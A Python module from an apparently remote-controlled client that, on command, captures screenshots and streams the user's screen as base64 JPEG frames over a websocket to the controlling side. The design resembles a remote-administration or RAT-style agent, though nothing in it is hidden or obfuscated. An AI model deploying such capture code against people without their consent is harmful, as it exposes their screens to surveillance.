import asyncio
import contextlib
import ctypes
import websockets
import base64
from io import BytesIO

from mss import mss
from typing import Optional
from PIL import ImageGrab, Image
from ..commands import Command, CommandArgs, ICommandModule, CommandResult


class StartStreamArgs(CommandArgs):
    monitor_number: int = 1

command_arg_map = {
    Command.SCREENSHOT: None,
    Command.START_SCREEN_RECORDING: StartStreamArgs,
    Command.STOP_SCREEN_RECORDING: None,
}

class Visuals(ICommandModule):
    streaming_task: Optional[asyncio.Task] = None

    @classmethod
    async def stream_screen(cls, websocket: websockets.WebSocketClientProtocol, args: StartStreamArgs):
        if cls.streaming_task and not cls.streaming_task.done():
            await websocket.close(reason="A streaming task is already running.")
            return  # Optionally, raise an exception if needed

        async def stream():
            with mss() as sct:
                monitor = sct.monitors[args.monitor_number]
                while True:
                    img = sct.grab(monitor)
                    with BytesIO() as buffer:
                        # Convert to JPEG for compression
                        image = Image.frombytes("RGB", img.size, img.rgb)
                        image.save(buffer, format="JPEG")
                        compressed_image = buffer.getvalue()


                    await websocket.send(base64.b64encode(compressed_image))
                    await asyncio.sleep(1/30)  # Control the frame rate

        cls.streaming_task = asyncio.create_task(stream())
        await cls.streaming_task 

    @classmethod
    async def stop_stream(cls, ws: websockets.WebSocketClientProtocol):
        if cls.streaming_task and not cls.streaming_task.done():
            cls.streaming_task.cancel()
            try:
                await cls.streaming_task
            except asyncio.CancelledError:
                print("Streaming task cancelled.")
            cls.streaming_task = None

    def screenshot(self) -> CommandResult:
        try:
            with contextlib.suppress(Exception):
                ctypes.windll.user32.SetProcessDPIAware()

            image = ImageGrab.grab()
            h, w = image.size
            mode = image.mode
            image_base64 = base64.b64encode(image.tobytes()).decode('ascii')

            return CommandResult(success=True, result={"size": (h, w), "mode": mode, "image": image_base64})
        except Exception as e:
            return CommandResult(success=False, result=f"Failed to take screenshot: {str(e)}")


    def run(self, command: Command, args: Optional[CommandArgs] = None) -> CommandResult:
        command_func_map = {
        }
        command_func_map_no_args = {
            Command.SCREENSHOT: self.screenshot            
        }

        if command in command_func_map or command in command_func_map_no_args:
            try:
                if command in command_func_map:
                    if not args:
                        return CommandResult(success=False, result="No Args passed")
                    return command_func_map.get(command)(args)
                else:
                    return command_func_map_no_args.get(command)()
            except Exception as e:
                return CommandResult(success=False, result=f"Error: {e}")
        else:
            return CommandResult(success=False, result="Command not found in module.")

    async def ws_run(self, command: Command, args: CommandArgs, ws: websockets.WebSocketClientProtocol) -> None:
        command_func_map = {
            Command.START_SCREEN_RECORDING: self.stream_screen,
        }
        command_func_map_no_args = {
            Command.STOP_SCREEN_RECORDING: self.stop_stream,
        }

        if command in command_func_map or command in command_func_map_no_args:
            try:
                if command in command_func_map:
                    if not args:
                        raise ValueError("No Args passed")
                    args = command_arg_map[command](**args.model_dump())
                    await command_func_map.get(command)(ws, args)
                else:
                    await command_func_map_no_args.get(command)(ws)
            except Exception as e:
                raise RuntimeError(f"Error: {e}")
        else:
            raise ValueError("Command not found in module.")



